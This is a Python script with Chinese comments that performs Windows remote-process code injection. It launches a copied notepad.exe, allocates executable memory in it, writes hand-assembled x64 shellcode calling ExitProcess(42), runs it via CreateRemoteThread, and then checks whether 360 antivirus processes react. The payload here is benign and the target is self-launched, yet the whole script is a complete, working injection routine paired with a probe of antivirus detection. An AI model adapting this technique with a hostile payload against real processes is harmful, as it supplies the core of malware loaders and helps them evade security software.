import ctypes, sys, subprocess, time, os
from ctypes import wintypes
sys.stdout.reconfigure(encoding='utf-8')
k=ctypes.windll.kernel32
k.OpenProcess.argtypes=[wintypes.DWORD,wintypes.BOOL,wintypes.DWORD]; k.OpenProcess.restype=wintypes.HANDLE
k.VirtualAllocEx.argtypes=[wintypes.HANDLE,wintypes.LPVOID,ctypes.c_size_t,wintypes.DWORD,wintypes.DWORD]; k.VirtualAllocEx.restype=wintypes.LPVOID
k.WriteProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPCVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]; k.WriteProcessMemory.restype=wintypes.BOOL
k.CreateRemoteThread.argtypes=[wintypes.HANDLE,wintypes.LPVOID,ctypes.c_size_t,wintypes.LPVOID,wintypes.LPVOID,wintypes.DWORD,wintypes.LPVOID]; k.CreateRemoteThread.restype=wintypes.HANDLE
k.WaitForSingleObject.argtypes=[wintypes.HANDLE,wintypes.DWORD]
k.GetExitCodeThread.argtypes=[wintypes.HANDLE,ctypes.POINTER(wintypes.DWORD)]
k.GetModuleHandleW.argtypes=[wintypes.LPCWSTR]; k.GetModuleHandleW.restype=wintypes.HMODULE
k.GetProcAddress.argtypes=[wintypes.HMODULE,wintypes.LPCSTR]; k.GetProcAddress.restype=wintypes.LPVOID

print("=== ★★★ 注入后行为测试：让注入代码做可观测动作 ===")
print()
target=os.path.join(os.environ['TEMP'],'dsh_inject_target.exe')
import shutil
shutil.copy(r'C:\Windows\System32\notepad.exe',target)
p=subprocess.Popen([target]); time.sleep(2)
pid=p.pid
print("  目标: %s PID %d"%(os.path.basename(target),pid))
h=k.OpenProcess(0x1F0FFF,False,pid)
print("  OpenProcess -> 0x%X"%h)
addr=k.VirtualAllocEx(h,None,4096,0x3000,0x40)
print("  VirtualAllocEx -> 0x%X"%(addr or 0))
# 注入 shellcode: 调用 ExitProcess(42) 让目标进程退出
# 需要 kernel32!ExitProcess 地址（同位数进程，地址相同）
k32=k.GetModuleHandleW("kernel32.dll")
exitproc=k.GetProcAddress(k32,b"ExitProcess")
print("  kernel32!ExitProcess = 0x%X"%(exitproc or 0))
# x64 shellcode: mov rcx, 42; mov rax, <addr>; call rax
# 48 C7 C1 2A 00 00 00    mov rcx, 42
# 48 B8 <8字节地址>        mov rax, addr
# FF D0                   call rax
sc = bytes([0x48,0xC7,0xC1,0x2A,0x00,0x00,0x00])
sc += bytes([0x48,0xB8]) + exitproc.to_bytes(8,'little')
sc += bytes([0xFF,0xD0])
print("  shellcode (%d 字节): %s"%(len(sc),sc.hex(' ')))
w=ctypes.c_size_t()
ok=k.WriteProcessMemory(h,addr,sc,len(sc),ctypes.byref(w))
print("  WriteProcessMemory -> %s (%d 字节)"%(bool(ok),w.value))
th=k.CreateRemoteThread(h,None,0,addr,None,0,None)
print("  CreateRemoteThread -> 0x%X"%(th or 0))
if th:
    k.WaitForSingleObject(th,5000)
    ec=wintypes.DWORD(); k.GetExitCodeThread(th,ctypes.byref(ec))
    print("  线程退出码: %d"%ec.value)
time.sleep(2)
print()
print("=== ★ 关键：目标进程是否真的退出了（退出码应为 42）===")
rc=p.poll()
print("  p.poll() = %s  %s"%(rc,'★ 进程已退出，退出码 42 = 注入代码执行成功' if rc==42 else '(未退出或退出码不同)'))
print()
print("=== ★ 360 是否反应（弹窗/新窗口）===")
out=subprocess.run(['tasklist','/fo','csv','/nh'],capture_output=True,text=True,encoding='utf-8',errors='replace').stdout
for line in out.splitlines():
    f=[x.strip('"') for x in line.split('","')]
    if len(f)>=2 and ('360' in f[0] or 'ZhuDong' in f[0] or 'DSMain' in f[0]):
        print("    %s PID %s"%(f[0],f[1]))
